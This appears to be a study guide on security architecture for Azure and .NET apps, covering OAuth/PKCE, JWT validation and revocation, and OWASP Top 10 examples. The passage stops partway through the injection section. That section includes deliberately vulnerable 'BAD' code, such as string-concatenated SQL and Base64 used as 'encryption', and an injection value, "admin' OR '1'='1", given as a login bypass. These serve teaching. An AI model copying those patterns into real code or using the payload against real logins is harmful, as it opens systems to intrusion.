# Day 12: Security Architecture - Deep Dive

## Overview
Master security architecture patterns, authentication and authorization mechanisms, vulnerability mitigation, and secure development practices for Azure and .NET applications. This guide covers defense-in-depth strategies essential for cloud architects.

---

## 1. Authentication vs Authorization Deep Dive

### Fundamental Concepts

**Architect's Mental Model:**
- **Authentication**: Identity verification - happens once per session
- **Authorization**: Permission checks - happens on every protected operation
- **Common mistake**: Confusing the two or doing authorization in authentication layer
- **Best practice**: Centralize AuthN (identity provider), distribute AuthZ (policy-based)

```
Authentication (AuthN)
"Who are you?"
┌──────────────────────────────────────┐
│ User provides credentials            │
│   ↓                                  │
│ System verifies identity             │
│   ↓                                  │
│ Issues proof of identity (token)     │
└──────────────────────────────────────┘

Authorization (AuthZ)
"What can you do?"
┌──────────────────────────────────────┐
│ User presents token                  │
│   ↓                                  │
│ System checks permissions            │
│   ↓                                  │
│ Grants or denies access              │
└──────────────────────────────────────┘
```

### Authentication Flow

```
┌─────────┐                                      ┌─────────────┐
│  User   │                                      │ Identity    │
│         │                                      │ Provider    │
└────┬────┘                                      │ (Azure AD)  │
     │                                           └─────┬───────┘
     │ 1. Request resource                             │
     ├────────────────────────────────────┐            │
     │                                    │            │
     │ 2. Redirect to login               │            │
     │<───────────────────────────────────┤            │
     │                                    │            │
     │ 3. Authenticate                    │            │
     ├───────────────────────────────────────────────>│
     │                                    │            │
     │ 4. Return token                    │            │
     │<───────────────────────────────────────────────┤
     │                                    │            │
     │ 5. Access with token               │            │
     ├────────────────────────────────────┤            │
     │                                    │            │
     │ 6. Validate token & authorize      │            │
     │    (Check claims, roles, scopes)   │            │
     │                                    │            │
     │ 7. Return protected resource       │            │
     │<───────────────────────────────────┤            │
```

### Implementation Examples

#### ASP.NET Core Authentication
```csharp
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        // JWT Bearer Authentication
        services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
            .AddJwtBearer(options =>
            {
                options.Authority = "https://login.microsoftonline.com/{tenant-id}";
                options.Audience = "api://my-api";
                options.TokenValidationParameters = new TokenValidationParameters
                {
                    ValidateIssuer = true,
                    ValidateAudience = true,
                    ValidateLifetime = true,
                    ValidateIssuerSigningKey = true,
                    ClockSkew = TimeSpan.FromMinutes(5),
                    NameClaimType = "preferred_username",
                    RoleClaimType = "roles"
                };

                options.Events = new JwtBearerEvents
                {
                    OnAuthenticationFailed = context =>
                    {
                        if (context.Exception is SecurityTokenExpiredException)
                        {
                            context.Response.Headers.Add("Token-Expired", "true");
                        }
                        return Task.CompletedTask;
                    },
                    OnTokenValidated = context =>
                    {
                        // Additional validation
                        var userId = context.Principal.FindFirstValue("sub");
                        if (string.IsNullOrEmpty(userId))
                        {
                            context.Fail("Missing user identifier");
                        }
                        return Task.CompletedTask;
                    }
                };
            });

        // Policy-based authorization
        services.AddAuthorization(options =>
        {
            // Role-based
            options.AddPolicy("RequireAdmin", policy =>
                policy.RequireRole("Admin"));

            // Claims-based
            options.AddPolicy("RequireManager", policy =>
                policy.RequireClaim("job_title", "Manager", "Director"));

            // Scope-based (API permissions)
            options.AddPolicy("ReadAccess", policy =>
                policy.RequireClaim("scope", "api.read"));

            // Custom requirement
            options.AddPolicy("Over18", policy =>
                policy.Requirements.Add(new MinimumAgeRequirement(18)));

            // Combine multiple requirements
            options.AddPolicy("AdminOrOwner", policy =>
                policy.RequireAssertion(context =>
                    context.User.IsInRole("Admin") ||
                    context.User.HasClaim(c => c.Type == "owner" && c.Value == "true")));
        });

        // Custom authorization handler
        services.AddSingleton<IAuthorizationHandler, MinimumAgeHandler>();
        services.AddSingleton<IAuthorizationHandler, ResourceOwnerHandler>();
    }

    public void Configure(IApplicationBuilder app)
    {
        app.UseAuthentication();  // Must come before UseAuthorization
        app.UseAuthorization();
    }
}
```

#### Custom Authorization Handlers
```csharp
// Requirement
public class MinimumAgeRequirement : IAuthorizationRequirement
{
    public int MinimumAge { get; }

    public MinimumAgeRequirement(int minimumAge)
    {
        MinimumAge = minimumAge;
    }
}

// Handler
public class MinimumAgeHandler : AuthorizationHandler<MinimumAgeRequirement>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        MinimumAgeRequirement requirement)
    {
        var dateOfBirthClaim = context.User.FindFirst(c => c.Type == "date_of_birth");

        if (dateOfBirthClaim == null)
        {
            return Task.CompletedTask;
        }

        if (DateTime.TryParse(dateOfBirthClaim.Value, out var dateOfBirth))
        {
            var age = DateTime.Today.Year - dateOfBirth.Year;
            if (dateOfBirth.Date > DateTime.Today.AddYears(-age))
            {
                age--;
            }

            if (age >= requirement.MinimumAge)
            {
                context.Succeed(requirement);
            }
        }

        return Task.CompletedTask;
    }
}

// Resource-based authorization
public class ResourceOwnerHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext context,
        SameAuthorRequirement requirement,
        Document resource)
    {
        var userId = context.User.FindFirstValue(ClaimTypes.NameIdentifier);

        if (resource.AuthorId == userId || context.User.IsInRole("Admin"))
        {
            context.Succeed(requirement);
        }

        return Task.CompletedTask;
    }
}

// Usage in controller
[HttpPut("{id}")]
public async Task<IActionResult> UpdateDocument(string id, Document updatedDocument)
{
    var document = await _documentService.GetDocumentAsync(id);

    if (document == null)
    {
        return NotFound();
    }

    // Resource-based authorization
    var authorizationResult = await _authorizationService
        .AuthorizeAsync(User, document, "SameAuthor");

    if (!authorizationResult.Succeeded)
    {
        return Forbid();
    }

    await _documentService.UpdateDocumentAsync(updatedDocument);
    return Ok();
}
```

---

## 2. OAuth 2.0 Flows & Grant Types

**Tech Lead Decision Matrix:**
- **Authorization Code + PKCE**: Web apps, SPAs, mobile apps (most secure, default choice)
- **Client Credentials**: Service-to-service, no user context, backend-only
- **Device Code**: Browserless devices (TV, IoT, CLI tools)
- **On-Behalf-Of**: API-to-API with delegated user permissions
- **Implicit Flow**: DEPRECATED - never use (replaced by Auth Code + PKCE)

### OAuth 2.0 Grant Types Overview

```
┌────────────────────────────────────────────────────────────┐
│ Grant Type          │ Use Case                             │
├────────────────────────────────────────────────────────────┤
│ Authorization Code  │ Web apps with backend server         │
│ + PKCE              │ Single Page Apps (SPAs)              │
│                     │ Mobile apps                          │
├────────────────────────────────────────────────────────────┤
│ Client Credentials  │ Service-to-service (daemon apps)     │
│                     │ Backend API calls                    │
├────────────────────────────────────────────────────────────┤
│ Device Code         │ Browserless devices (TV, IoT)        │
├────────────────────────────────────────────────────────────┤
│ On-Behalf-Of        │ API calling another API              │
│                     │ (delegated permissions)              │
└────────────────────────────────────────────────────────────┘
```

### Authorization Code Flow (Web App)

```
┌─────────┐                                  ┌──────────────┐
│ Browser │                                  │ Web App      │
└────┬────┘                                  │ (Backend)    │
     │                                       └──────┬───────┘
     │                                              │
     │ 1. Login request                             │
     ├─────────────────────────────────────────────>│
     │                                              │
     │ 2. Redirect to Azure AD                      │
     │    + client_id, redirect_uri, scope          │
     │<─────────────────────────────────────────────┤
     │                                              │
     ├──────────────────────┐                       │
     │ Azure AD             │                       │
     │ 3. User authenticates│                       │
     │ 4. Consent screen    │                       │
     │<─────────────────────┘                       │
     │                                              │
     │ 5. Redirect back with authorization code     │
     ├─────────────────────────────────────────────>│
     │                                              │
     │                                              │ 6. Exchange code for token
     │                                              │    + client_id, client_secret
     │                                              ├────────────────────┐
     │                                              │                    │
     │                                              │<───────────────────┘
     │                                              │ 7. Access token +
     │                                              │    Refresh token
     │ 8. Return protected resource                 │
     │<─────────────────────────────────────────────┤
```

### Authorization Code Flow with PKCE (React SPA)

**PKCE (Proof Key for Code Exchange)** is required for SPAs because they cannot securely store client secrets.

```
┌─────────────┐                               ┌──────────────┐
│ React SPA   │                               │ Azure AD     │
└──────┬──────┘                               └──────┬───────┘
       │                                             │
       │ 1. Generate code_verifier (random string)  │
       │    SHA256(code_verifier) = code_challenge  │
       │                                             │
       │ 2. Redirect to /authorize                   │
       │    + code_challenge, challenge_method=S256  │
       ├────────────────────────────────────────────>│
       │                                             │
       │ 3. User authenticates & consents            │
       │                                             │
       │ 4. Redirect back with authorization code    │
       │<────────────────────────────────────────────┤
       │                                             │
       │ 5. POST /token with:                        │
       │    - authorization code                     │
       │    - code_verifier (proves ownership)       │
       │    - NO client_secret needed                │
       ├────────────────────────────────────────────>│
       │                                             │
       │                                             │ 6. Validate:
       │                                             │    SHA256(code_verifier)
       │                                             │    == stored code_challenge
       │                                             │
       │ 7. Access token + Refresh token             │
       │<────────────────────────────────────────────┤
       │ (Stored in memory, NOT localStorage)        │
```

**React Implementation with MSAL:**
```typescript
// authConfig.ts
import { Configuration, PublicClientApplication } from '@azure/msal-browser';

export const msalConfig: Configuration = {
    auth: {
        clientId: process.env.REACT_APP_CLIENT_ID!,
        authority: `https://login.microsoftonline.com/${process.env.REACT_APP_TENANT_ID}`,
        redirectUri: window.location.origin,
    },
    cache: {
        cacheLocation: 'sessionStorage',  // Or 'memory' for highest security
        storeAuthStateInCookie: false,
    },
};

export const loginRequest = {
    scopes: ['openid', 'profile', 'api://your-api-id/access_as_user'],
};

export const msalInstance = new PublicClientApplication(msalConfig);

// App.tsx - Initialize MSAL
import { MsalProvider, useMsal, useIsAuthenticated } from '@azure/msal-react';
import { InteractionStatus } from '@azure/msal-browser';

function App() {
    return (
        <MsalProvider instance={msalInstance}>
            <MainApp />
        </MsalProvider>
    );
}

function MainApp() {
    const { instance, inProgress } = useMsal();
    const isAuthenticated = useIsAuthenticated();

    const handleLogin = async () => {
        try {
            await instance.loginPopup(loginRequest);
        } catch (error) {
            console.error('Login failed:', error);
        }
    };

    const handleLogout = async () => {
        await instance.logoutPopup({
            mainWindowRedirectUri: '/',
        });
    };

    if (inProgress === InteractionStatus.None && !isAuthenticated) {
        return (
            <div>
                <h1>Please sign in</h1>
                <button onClick={handleLogin}>Login</button>
            </div>
        );
    }

    return (
        <div>
            <h1>Protected App</h1>
            <button onClick={handleLogout}>Logout</button>
            <ProtectedContent />
        </div>
    );
}

// Protected API calls with token
function ProtectedContent() {
    const { instance, accounts } = useMsal();
    const [data, setData] = useState<any>(null);

    const fetchProtectedData = async () => {
        try {
            // Acquire token silently
            const response = await instance.acquireTokenSilent({
                scopes: loginRequest.scopes,
                account: accounts[0],
            });

            // Call API with token
            const apiResponse = await fetch('/api/orders', {
                headers: {
                    'Authorization': `Bearer ${response.accessToken}`,
                },
            });

            setData(await apiResponse.json());
        } catch (error) {
            // Token expired or silent acquisition failed
            if (error instanceof InteractionRequiredAuthError) {
                // Trigger interactive flow
                const response = await instance.acquireTokenPopup(loginRequest);
                // Retry API call with new token
            }
        }
    };

    return <div>{/* Render data */}</div>;
}
```

**Security Comparison: Traditional Web App vs SPA**

| Aspect | Web App (Backend) | React SPA (PKCE) |
|--------|-------------------|------------------|
| **Client Secret** | Stored securely on server | Not needed (PKCE replaces it) |
| **Token Storage** | Server-side session (secure) | Memory/sessionStorage (vulnerable) |
| **XSS Risk** | Low (tokens never in browser) | High (tokens accessible to JS) |
| **CSRF Protection** | Required (anti-forgery tokens) | Less concern (no cookies) |
| **Refresh Token** | Stored server-side | Should rotate or use short-lived |
| **Best Practice** | Use HttpOnly cookies | Use short-lived tokens + silent refresh |

**React Token Storage Decision Matrix:**

```typescript
// Option 1: Memory-only (Most Secure, but lost on refresh)
// Best for: High-security apps where re-login on refresh is acceptable
class TokenManager {
    private static accessToken: string | null = null;
    private static refreshToken: string | null = null;

    static setTokens(access: string, refresh: string) {
        this.accessToken = access;
        this.refreshToken = refresh;
        // Tokens lost on page refresh - user must re-authenticate
    }

    static getAccessToken() {
        return this.accessToken;
    }
}

// Option 2: SessionStorage (Moderate Security)
// Best for: Balance between UX and security
// Pros: Survives refresh, cleared on tab close
// Cons: Vulnerable to XSS attacks
sessionStorage.setItem('token', response.accessToken);

// Option 3: LocalStorage (Least Secure - AVOID)
// Vulnerable to XSS, persists across sessions
// Only use if you absolutely need token persistence
localStorage.setItem('token', response.accessToken);  // ❌ Not recommended

// Option 4: HttpOnly Cookies (Backend Required)
// Best for: Maximum security with BFF pattern
// Backend sets: Set-Cookie: token=xyz; HttpOnly; Secure; SameSite=Strict
// React: No manual token handling needed
```

**Interview Talking Points:**
- "For SPAs, we use Auth Code + PKCE because we can't store client secrets securely"
- "Tokens in sessionStorage are vulnerable to XSS, so we implement strict CSP policies"
- "For high-security apps, we use the BFF pattern where tokens never reach the browser"
- "MSAL.js handles token refresh automatically using silent iframe flows"

**Implementation:**
```csharp
public class Startup
{
    public void ConfigureServices(IServiceCollection services)
    {
        services.AddAuthentication(OpenIdConnectDefaults.AuthenticationScheme)
            .AddMicrosoftIdentityWebApp(options =>
            {
                Configuration.Bind("AzureAd", options);

                options.Events = new OpenIdConnectEvents
                {
                    OnTokenValidated = async context =>
                    {
                        // Custom logic after token validation
                        var userId = context.Principal.FindFirstValue("sub");
                        await LogUserLoginAsync(userId);
                    },
                    OnAuthenticationFailed = context =>
                    {
                        context.HandleResponse();
                        context.Response.Redirect("/Error/AuthenticationFailed");
                        return Task.CompletedTask;
                    }
                };
            })
            .EnableTokenAcquisitionToCallDownstreamApi(
                Configuration.GetSection("DownstreamApi:Scopes").Get<string[]>())
            .AddInMemoryTokenCaches();  // Or AddDistributedTokenCaches for production
    }
}

// appsettings.json
{
  "AzureAd": {
    "Instance": "https://login.microsoftonline.com/",
    "Domain": "contoso.onmicrosoft.com",
    "TenantId": "{tenant-id}",
    "ClientId": "{client-id}",
    "ClientSecret": "{client-secret}",  // Use Key Vault in production
    "CallbackPath": "/signin-oidc",
    "SignedOutCallbackPath": "/signout-callback-oidc"
  },
  "DownstreamApi": {
    "BaseUrl": "https://api.contoso.com",
    "Scopes": ["api://my-api/.default"]
  }
}
```

### Authorization Code Flow with PKCE (SPA/Mobile)

```
PKCE (Proof Key for Code Exchange)
Prevents authorization code interception attack

Client generates:
1. code_verifier: Random string (43-128 chars)
2. code_challenge: SHA256(code_verifier) -> Base64URL

Flow:
1. Authorization request includes code_challenge
2. Token request includes code_verifier
3. Server verifies: SHA256(code_verifier) == code_challenge
```

**JavaScript SPA Example (MSAL.js):**
```javascript
import { PublicClientApplication } from "@azure/msal-browser";

const msalConfig = {
    auth: {
        clientId: "{client-id}",
        authority: "https://login.microsoftonline.com/{tenant-id}",
        redirectUri: "https://localhost:3000",
    },
    cache: {
        cacheLocation: "sessionStorage",  // or "localStorage"
        storeAuthStateInCookie: false,
    }
};

const msalInstance = new PublicClientApplication(msalConfig);

// Login
async function login() {
    const loginRequest = {
        scopes: ["User.Read", "api://my-api/access_as_user"]
    };

    try {
        const loginResponse = await msalInstance.loginPopup(loginRequest);
        console.log("Login successful:", loginResponse);
    } catch (error) {
        console.error("Login failed:", error);
    }
}

// Get access token
async function getAccessToken() {
    const account = msalInstance.getAllAccounts()[0];

    const tokenRequest = {
        scopes: ["api://my-api/access_as_user"],
        account: account
    };

    try {
        // Silent token acquisition
        const response = await msalInstance.acquireTokenSilent(tokenRequest);
        return response.accessToken;
    } catch (error) {
        if (error instanceof InteractionRequiredAuthError) {
            // Fallback to interactive
            const response = await msalInstance.acquireTokenPopup(tokenRequest);
            return response.accessToken;
        }
        throw error;
    }
}

// Call API with token
async function callApi() {
    const token = await getAccessToken();

    const response = await fetch("https://api.contoso.com/data", {
        headers: {
            "Authorization": `Bearer ${token}`,
            "Content-Type": "application/json"
        }
    });

    return await response.json();
}
```

### Client Credentials Flow (Service-to-Service)

```csharp
public class ApiClientService
{
    private readonly IConfidentialClientApplication _app;
    private readonly HttpClient _httpClient;
    private string _cachedToken;
    private DateTime _tokenExpiry;

    public ApiClientService(IHttpClientFactory httpClientFactory, IConfiguration configuration)
    {
        _httpClient = httpClientFactory.CreateClient();

        _app = ConfidentialClientApplicationBuilder
            .Create(configuration["AzureAd:ClientId"])
            .WithClientSecret(configuration["AzureAd:ClientSecret"])
            .WithAuthority(new Uri($"https://login.microsoftonline.com/{configuration["AzureAd:TenantId"]}"))
            .Build();
    }

    public async Task<string> GetAccessTokenAsync()
    {
        // Return cached token if still valid
        if (!string.IsNullOrEmpty(_cachedToken) && DateTime.UtcNow < _tokenExpiry)
        {
            return _cachedToken;
        }

        var scopes = new[] { "api://downstream-api/.default" };

        try
        {
            var result = await _app.AcquireTokenForClient(scopes)
                .ExecuteAsync();

            _cachedToken = result.AccessToken;
            _tokenExpiry = result.ExpiresOn.UtcDateTime.AddMinutes(-5);  // Refresh 5 min early

            return _cachedToken;
        }
        catch (MsalServiceException ex)
        {
            Log.Error(ex, "Failed to acquire token");
            throw;
        }
    }

    public async Task<T> CallApiAsync<T>(string endpoint)
    {
        var token = await GetAccessTokenAsync();

        var request = new HttpRequestMessage(HttpMethod.Get, endpoint);
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", token);

        var response = await _httpClient.SendAsync(request);
        response.EnsureSuccessStatusCode();

        var content = await response.Content.ReadAsStringAsync();
        return JsonSerializer.Deserialize<T>(content);
    }
}
```

### On-Behalf-Of Flow (API Chain)

```csharp
public class OrderApiController : ControllerBase
{
    private readonly ITokenAcquisition _tokenAcquisition;
    private readonly HttpClient _httpClient;

    // API receives user token, calls downstream API on behalf of user
    [HttpGet("orders/{id}")]
    [Authorize]
    public async Task<IActionResult> GetOrder(string id)
    {
        // Get downstream API token using OBO flow
        var scopes = new[] { "api://inventory-api/.default" };
        var accessToken = await _tokenAcquisition.GetAccessTokenForUserAsync(scopes);

        // Call downstream API
        var request = new HttpRequestMessage(HttpMethod.Get,
            $"https://inventory-api.contoso.com/items/{id}");
        request.Headers.Authorization = new AuthenticationHeaderValue("Bearer", accessToken);

        var response = await _httpClient.SendAsync(request);

        if (!response.IsSuccessStatusCode)
        {
            return StatusCode((int)response.StatusCode);
        }

        var inventory = await response.Content.ReadFromJsonAsync<InventoryItem>();
        return Ok(inventory);
    }
}

// Startup configuration
public void ConfigureServices(IServiceCollection services)
{
    services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
        .AddMicrosoftIdentityWebApi(Configuration.GetSection("AzureAd"))
        .EnableTokenAcquisitionToCallDownstreamApi()
        .AddInMemoryTokenCaches();

    services.AddHttpClient();
}
```

---

## 3. JWT Lifecycle & Token Revocation

### JWT Structure

```
JWT = Header.Payload.Signature

Header (Base64URL encoded):
{
  "alg": "RS256",
  "typ": "JWT",
  "kid": "key-id-123"
}

Payload (Base64URL encoded):
{
  "iss": "https://login.microsoftonline.com/{tenant}/v2.0",
  "sub": "user-id-123",
  "aud": "api://my-api",
  "exp": 1704067200,
  "nbf": 1704063600,
  "iat": 1704063600,
  "roles": ["User", "Admin"],
  "scp": "api.read api.write",
  "oid": "object-id",
  "tid": "tenant-id"
}

Signature:
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  private_key
)
```

### Token Validation

```csharp
public class JwtTokenValidator
{
    private readonly IConfiguration _configuration;
    private readonly IMemoryCache _cache;

    public async Task<ClaimsPrincipal> ValidateTokenAsync(string token)
    {
        var tokenHandler = new JwtSecurityTokenHandler();

        // Get signing keys from Azure AD
        var configManager = new ConfigurationManager<OpenIdConnectConfiguration>(
            $"https://login.microsoftonline.com/{_configuration["AzureAd:TenantId"]}/v2.0/.well-known/openid-configuration",
            new OpenIdConnectConfigurationRetriever());

        var openIdConfig = await configManager.GetConfigurationAsync(CancellationToken.None);

        var validationParameters = new TokenValidationParameters
        {
            ValidateIssuerSigningKey = true,
            IssuerSigningKeys = openIdConfig.SigningKeys,

            ValidateIssuer = true,
            ValidIssuer = $"https://login.microsoftonline.com/{_configuration["AzureAd:TenantId"]}/v2.0",

            ValidateAudience = true,
            ValidAudience = _configuration["AzureAd:ClientId"],

            ValidateLifetime = true,
            ClockSkew = TimeSpan.FromMinutes(5),

            // Additional custom validation
            LifetimeValidator = CustomLifetimeValidator,
            IssuerValidator = CustomIssuerValidator
        };

        try
        {
            var principal = tokenHandler.ValidateToken(token, validationParameters, out var validatedToken);

            // Additional checks
            ValidateTokenType(validatedToken);
            await ValidateTokenRevocationAsync(validatedToken);

            return principal;
        }
        catch (SecurityTokenException ex)
        {
            Log.Warning(ex, "Token validation failed");
            throw;
        }
    }

    private bool CustomLifetimeValidator(
        DateTime? notBefore,
        DateTime? expires,
        SecurityToken token,
        TokenValidationParameters validationParameters)
    {
        if (expires == null)
        {
            return false;
        }

        // Reject tokens valid for more than 1 hour
        if (notBefore.HasValue && (expires.Value - notBefore.Value).TotalHours > 1)
        {
            return false;
        }

        return expires > DateTime.UtcNow;
    }

    private string CustomIssuerValidator(
        string issuer,
        SecurityToken token,
        TokenValidationParameters validationParameters)
    {
        var allowedIssuers = new[]
        {
            $"https://login.microsoftonline.com/{_configuration["AzureAd:TenantId"]}/v2.0",
            $"https://sts.windows.net/{_configuration["AzureAd:TenantId"]}/"
        };

        if (!allowedIssuers.Contains(issuer))
        {
            throw new SecurityTokenInvalidIssuerException($"Invalid issuer: {issuer}");
        }

        return issuer;
    }

    private void ValidateTokenType(SecurityToken token)
    {
        if (token is JwtSecurityToken jwtToken)
        {
            // Ensure it's an access token, not ID token
            if (!jwtToken.Header.TryGetValue("typ", out var typ) ||
                typ.ToString() != "at+jwt")
            {
                // Check for v1 tokens
                if (jwtToken.Claims.All(c => c.Type != "scp" && c.Type != "roles"))
                {
                    throw new SecurityTokenException("Invalid token type");
                }
            }
        }
    }

    private async Task ValidateTokenRevocationAsync(SecurityToken token)
    {
        var jwtToken = token as JwtSecurityToken;
        var jti = jwtToken?.Claims.FirstOrDefault(c => c.Type == "jti")?.Value;

        if (string.IsNullOrEmpty(jti))
        {
            return;
        }

        // Check if token is in revocation list (Redis/database)
        var isRevoked = await _cache.GetOrCreateAsync($"revoked:{jti}", async entry =>
        {
            entry.AbsoluteExpirationRelativeToNow = TimeSpan.FromMinutes(60);
            return await CheckTokenRevocationDatabaseAsync(jti);
        });

        if (isRevoked)
        {
            throw new SecurityTokenException("Token has been revoked");
        }
    }

    private async Task<bool> CheckTokenRevocationDatabaseAsync(string jti)
    {
        // Check Redis or database for revoked tokens
        // Implementation depends on your revocation storage
        return false;
    }
}
```

### Token Revocation Strategies

```csharp
public class TokenRevocationService
{
    private readonly IDistributedCache _cache;
    private readonly IDatabase _redis;

    // Strategy 1: Token Blacklist (for explicit revocation)
    public async Task RevokeTokenAsync(string jti, DateTime expiry)
    {
        var ttl = expiry - DateTime.UtcNow;

        if (ttl > TimeSpan.Zero)
        {
            await _cache.SetStringAsync(
                $"revoked:{jti}",
                "true",
                new DistributedCacheEntryOptions
                {
                    AbsoluteExpiration = expiry
                });
        }
    }

    // Strategy 2: User Session Revocation (logout all devices)
    public async Task RevokeAllUserTokensAsync(string userId)
    {
        var sessionId = Guid.NewGuid().ToString();

        await _redis.StringSetAsync(
            $"user:session:{userId}",
            sessionId,
            expiry: TimeSpan.FromDays(30));

        // Tokens validated against current session ID
    }

    public async Task<bool> IsUserSessionValidAsync(string userId, string tokenSessionId)
    {
        var currentSessionId = await _redis.StringGetAsync($"user:session:{userId}");

        return currentSessionId.HasValue && currentSessionId.ToString() == tokenSessionId;
    }

    // Strategy 3: Short-lived tokens with refresh tokens
    public class TokenResponse
    {
        public string AccessToken { get; set; }  // Short-lived: 5-15 minutes
        public string RefreshToken { get; set; }  // Long-lived: 7-90 days
        public int ExpiresIn { get; set; }
    }

    public async Task<TokenResponse> RefreshAccessTokenAsync(string refreshToken)
    {
        // Validate refresh token
        var storedToken = await _redis.StringGetAsync($"refresh:{refreshToken}");

        if (!storedToken.HasValue)
        {
            throw new SecurityTokenException("Invalid refresh token");
        }

        var userId = storedToken.ToString();

        // Generate new access token
        var newAccessToken = GenerateAccessToken(userId, expiryMinutes: 15);

        // Optionally rotate refresh token
        var newRefreshToken = Guid.NewGuid().ToString();
        await _redis.KeyDeleteAsync($"refresh:{refreshToken}");
        await _redis.StringSetAsync(
            $"refresh:{newRefreshToken}",
            userId,
            expiry: TimeSpan.FromDays(30));

        return new TokenResponse
        {
            AccessToken = newAccessToken,
            RefreshToken = newRefreshToken,
            ExpiresIn = 900  // 15 minutes
        };
    }

    // Strategy 4: Token versioning
    public async Task InvalidateAllTokensBeforeAsync(string userId, DateTime timestamp)
    {
        await _redis.StringSetAsync(
            $"user:token:invalidate:{userId}",
            timestamp.Ticks.ToString(),
            expiry: TimeSpan.FromDays(90));
    }

    public async Task<bool> IsTokenValidForUserAsync(string userId, DateTime tokenIssuedAt)
    {
        var invalidateAfterTicks = await _redis.StringGetAsync($"user:token:invalidate:{userId}");

        if (!invalidateAfterTicks.HasValue)
        {
            return true;
        }

        var invalidateAfter = new DateTime(long.Parse(invalidateAfterTicks));
        return tokenIssuedAt > invalidateAfter;
    }
}

// Middleware to check token revocation
public class TokenRevocationMiddleware
{
    private readonly RequestDelegate _next;
    private readonly TokenRevocationService _revocationService;

    public async Task InvokeAsync(HttpContext context)
    {
        if (context.User.Identity?.IsAuthenticated == true)
        {
            var jti = context.User.FindFirstValue("jti");
            var userId = context.User.FindFirstValue("sub");
            var issuedAt = context.User.FindFirstValue("iat");

            // Check blacklist
            if (!string.IsNullOrEmpty(jti))
            {
                var expiry = context.User.FindFirstValue("exp");
                var expiryDate = DateTimeOffset.FromUnixTimeSeconds(long.Parse(expiry)).UtcDateTime;

                // Token is revoked
                var isRevoked = await _revocationService.IsTokenRevokedAsync(jti);
                if (isRevoked)
                {
                    context.Response.StatusCode = 401;
                    await context.Response.WriteAsJsonAsync(new { error = "Token revoked" });
                    return;
                }
            }

            // Check token version/timestamp
            if (!string.IsNullOrEmpty(issuedAt) && !string.IsNullOrEmpty(userId))
            {
                var issuedAtDate = DateTimeOffset.FromUnixTimeSeconds(long.Parse(issuedAt)).UtcDateTime;
                var isValid = await _revocationService.IsTokenValidForUserAsync(userId, issuedAtDate);

                if (!isValid)
                {
                    context.Response.StatusCode = 401;
                    await context.Response.WriteAsJsonAsync(new { error = "Token invalidated" });
                    return;
                }
            }
        }

        await _next(context);
    }
}
```

---

## 4. OWASP Top 10 with Examples

### 1. Broken Access Control

**Vulnerability:**
```csharp
// BAD: No authorization check
[HttpGet("users/{id}")]
public async Task<IActionResult> GetUser(string id)
{
    var user = await _userService.GetUserAsync(id);
    return Ok(user);
}
// Any authenticated user can access any other user's data
```

**Mitigation:**
```csharp
// GOOD: Resource-based authorization
[HttpGet("users/{id}")]
[Authorize]
public async Task<IActionResult> GetUser(string id)
{
    var currentUserId = User.FindFirstValue(ClaimTypes.NameIdentifier);

    // Check if user can access this resource
    if (id != currentUserId && !User.IsInRole("Admin"))
    {
        return Forbid();
    }

    var user = await _userService.GetUserAsync(id);
    return Ok(user);
}

// BETTER: Policy-based authorization
[HttpGet("users/{id}")]
[Authorize(Policy = "CanAccessUser")]
public async Task<IActionResult> GetUser(string id)
{
    var user = await _userService.GetUserAsync(id);

    var authResult = await _authorizationService.AuthorizeAsync(
        User, user, "CanAccessUser");

    if (!authResult.Succeeded)
    {
        return Forbid();
    }

    return Ok(user);
}
```

### 2. Cryptographic Failures

**Vulnerability:**
```csharp
// BAD: Weak encryption
public string EncryptData(string data)
{
    return Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
    // Base64 is encoding, NOT encryption
}

// BAD: Hardcoded keys
var key = "MySecretKey123!";
```

**Mitigation:**
```csharp
// GOOD: Proper encryption with Azure Key Vault
public class DataProtectionService
{
    private readonly CryptographyClient _cryptoClient;

    public DataProtectionService(SecretClient secretClient)
    {
        var keyName = "data-encryption-key";
        _cryptoClient = new CryptographyClient(
            new Uri($"https://myvault.vault.azure.net/keys/{keyName}"),
            new DefaultAzureCredential());
    }

    public async Task<string> EncryptDataAsync(string plaintext)
    {
        var plaintextBytes = Encoding.UTF8.GetBytes(plaintext);
        var encryptResult = await _cryptoClient.EncryptAsync(
            EncryptionAlgorithm.RsaOaep256,
            plaintextBytes);

        return Convert.ToBase64String(encryptResult.Ciphertext);
    }

    public async Task<string> DecryptDataAsync(string ciphertext)
    {
        var ciphertextBytes = Convert.FromBase64String(ciphertext);
        var decryptResult = await _cryptoClient.DecryptAsync(
            EncryptionAlgorithm.RsaOaep256,
            ciphertextBytes);

        return Encoding.UTF8.GetString(decryptResult.Plaintext);
    }
}

// For application secrets: ASP.NET Core Data Protection
public void ConfigureServices(IServiceCollection services)
{
    services.AddDataProtection()
        .PersistKeysToAzureBlobStorage(new Uri("https://mystorage.blob.core.windows.net/keys/dataprotection.xml"))
        .ProtectKeysWithAzureKeyVault(new Uri("https://myvault.vault.azure.net/keys/dataprotection"), new DefaultAzureCredential())
        .SetApplicationName("MyApp");
}

// Password hashing
public class PasswordHasher
{
    public string HashPassword(string password)
    {
        // Use bcrypt, Argon2, or PBKDF2
        return BCrypt.Net.BCrypt.HashPassword(password, workFactor: 12);
    }

    public bool VerifyPassword(string password, string hash)
    {
        return BCrypt.Net.BCrypt.Verify(password, hash);
    }
}
```

### 3. Injection (SQL, NoSQL, Command)

**Vulnerability:**
```csharp
// BAD: SQL Injection
public async Task<User> GetUserByName(string username)
{
    var query = $"SELECT * FROM Users WHERE Username = '{username}'";
    // username = "admin' OR '1'='1" bypasses authentication
    return await _db.QueryFirstOrDefaultAsync<User>(query);
}

// BAD: NoSQL Injection
var filter = $"{{ username: '{username}' }}";
```

**Mitigation:**
```csharp
// GOOD: Parameterized queries (Entity Framework)
public async Task<User> GetUserByName(string username)
{
    return await _context.Users
        .Where(u => u.Username == username)
        .FirstOrDefaultAsync();
}

// GOOD: Parameterized queries (Dapper)
public async Task<User> GetUserByName(string username)
{
    var query = "SELECT * FROM Users WHERE Username = @Username";
    return await _db.QueryFirstOrDefaultAsync<User>(query, new { Username = username });
}

// GOOD: Cosmos DB parameterized queries
